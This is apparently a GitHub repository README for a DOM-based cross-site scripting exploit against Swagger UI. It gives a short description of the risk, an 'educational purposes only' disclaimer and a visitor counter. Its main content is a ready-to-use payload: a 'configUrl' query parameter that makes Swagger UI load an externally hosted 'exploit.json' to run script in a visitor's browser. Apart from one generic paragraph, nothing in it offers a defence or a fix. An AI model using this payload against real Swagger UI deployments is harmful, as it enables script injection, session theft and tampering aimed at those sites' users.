# DOM-based XSS in Swagger UI
<a href="https://www.json.org/"><img src="https://img.shields.io/badge/JSON-000?logo=json&logoColor=fff"></a>
<a href="https://www.javascript.com/"><img src="https://img.shields.io/badge/JavaScript-F7DF1E?logo=javascript&logoColor=000)"></a>
<a href="https://yaml.org/"><img src="https://img.shields.io/badge/YAML-CB171E?logo=yaml&logoColor=fff"></a>

Swagger UI is a web-based tool that renders API documentation from an OpenAPI specification in an interactive way, allowing developers to view endpoints, parameters, and even test requests directly in the browser. However, since it runs on the client side, there’s a potential risk of **DOM-Based XSS** if user input or API responses are reflected on the page without proper sanitization, which could allow malicious scripts to execute. So while Swagger UI is great for testing and exploring APIs, it’s important to secure it against injection attacks.

> [!WARNING]
> This repository is for educational purposes only, do not use this source for illegal activities and the like, all risks are borne by each individual.

<p align="center"> 
  <b> Visitor Count </b><br><br>
  <img src="https://api.visitorbadge.io/api/VisitorHit?user=randixploit&repo=swagger-xss&countColor=%237B1E7A" />
</p>

<b>Payload</b>
```
?configUrl=https://raw.githubusercontent.com/randixploit/swagger-xss/refs/heads/main/exploit.json
```

IB: [@coffinxp](https://github.com/coffinxp)
